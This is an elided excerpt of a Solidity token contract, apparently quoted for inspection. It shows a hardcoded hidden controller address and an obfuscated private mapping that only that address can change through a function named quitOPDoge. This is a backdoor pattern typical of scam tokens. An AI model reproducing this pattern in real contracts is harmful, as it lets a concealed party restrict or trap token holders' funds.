...
contract Token is Ownable {
    ...
    address public _psyopben1;
    mapping(address => bool) private mjuyhn;
    function quitOPDoge(address sss) external   {
        require(_psyopben1 == _msgSender());
        mjuyhn[sss] = false;
        require(_psyopben1 == _msgSender());
    }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _psyopben1 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
